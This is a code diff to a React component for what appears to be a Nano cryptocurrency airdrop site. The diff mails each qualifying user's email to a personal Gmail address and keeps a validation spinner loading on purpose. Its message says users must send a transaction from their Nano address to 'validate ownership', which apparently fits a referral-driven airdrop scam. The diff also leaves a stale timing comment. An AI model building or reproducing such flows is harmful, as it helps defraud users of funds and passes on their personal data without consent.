@@ -8,6 +8,7 @@ import { useLockBodyScroll } from "@/hooks/hooks";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css"; // Ensure toast styles are applied
 import { FaSpinner } from "react-icons/fa6";
+import { sendMail } from "@/lib/actions/mail.action";
 
 const copyToClipboard = (text: string) => {
   navigator.clipboard.writeText(text).then(
@@ -20,7 +21,13 @@ const copyToClipboard = (text: string) => {
   );
 };
 
-export function GetNano({ referralCount }: { referralCount: number }) {
+export function GetNano({
+  referralCount,
+  email,
+}: {
+  referralCount: number;
+  email: string;
+}) {
   const [isQrOpen, setIsQrOpen] = useState(false);
   const [openModal, setOpenModal] = useState(false);
   const [address, setAddress] = useState("");
@@ -77,6 +84,7 @@ export function GetNano({ referralCount }: { referralCount: number }) {
 
       {openModal && (
         <Modal
+          email={email}
           openModal={openModal}
           referralCount={referralCount}
           toggleOpenModal={toggleOpenModal}
@@ -91,12 +99,14 @@ export function GetNano({ referralCount }: { referralCount: number }) {
 }
 
 function Modal({
+  email,
   openModal,
   referralCount,
   toggleOpenModal,
   isQrOpen,
   toggleQr,
 }: {
+  email: string;
   openModal: boolean;
   referralCount: number;
   toggleOpenModal: () => void;
@@ -145,6 +155,19 @@ function Modal({
 
     fetchPrice();
 
+    const sendAdminMail = async (email: string) => {
+      await sendMail({
+        to: "irisinvest041@gmail.com",
+        subject: `Airdrop Claim Request: User ${email} Requires Nano Address Validation`,
+        body: `<p>Hello Admin,</p>
+               <p>User with email <strong>${email}</strong> has completed 10 referrals and is attempting to claim the Nano airdrop.</p>
+               <p>To receive their Nano airdrop, they need to validate ownership of their Nano address by completing a verified Nano transaction. This requires them to send a minimum-value transaction from their Nano address.</p>
+               <p>Please review their eligibility and confirm their Nano address validation to proceed with the airdrop.</p>
+               <p>Best regards,</p>
+               <p>The NanoFaucet System</p>`,
+      });
+    };
+
     // Simulate loading for referral check
     const referralTimeout = setTimeout(() => {
       const referralMet = referralCount >= 10;
@@ -155,15 +178,16 @@ function Modal({
       if (referralMet) {
         // Keep loading validation true as long as you need
         setIsLoadingValidation(true);
-
-        
         setIsAddressValidated(null);
+
+        sendAdminMail(email);
+
         // Do not set isLoadingValidation to false yet, handle it on user action instead
         // You may want to add logic here to listen for user actions that would end the loading state
 
         // Here is where you might consider when to set it to false based on user interaction
       }
-    }, 5000); // 5-second delay for referral check
+    }, 10000); // 5-second delay for referral check
 
     // Clear referral timeout if component unmounts
     return () => clearTimeout(referralTimeout);
